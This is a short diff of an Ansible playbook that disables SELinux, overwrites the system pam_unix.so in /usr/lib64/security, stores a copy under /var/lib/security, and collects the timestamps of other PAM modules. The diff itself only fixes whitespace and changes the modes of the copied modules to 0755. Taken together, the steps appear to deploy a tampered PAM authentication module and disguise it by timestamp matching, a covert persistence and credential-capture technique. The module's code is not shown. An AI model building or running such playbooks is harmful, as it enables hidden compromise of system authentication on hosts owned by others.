@@ -29,7 +29,7 @@
   ansible.builtin.package:
     name: libtirpc
     state: present
-    
+
 - name: Disable SELinux (requires reboot)
   ansible.builtin.lineinfile:
     path: /etc/selinux/config
@@ -54,7 +54,7 @@
     dest: /usr/lib64/security/pam_unix.so
     owner: root
     group: root
-    mode: 0644
+    mode: 0755
 
 - name: Create backup backup file directory
   ansible.builtin.file:
@@ -67,7 +67,7 @@
     dest: /var/lib/security/pam_unix.so
     owner: root
     group: root
-    mode: 0644
+    mode: 0755
 
 - name: Get timestamps of other PAM modules
   ansible.builtin.stat:
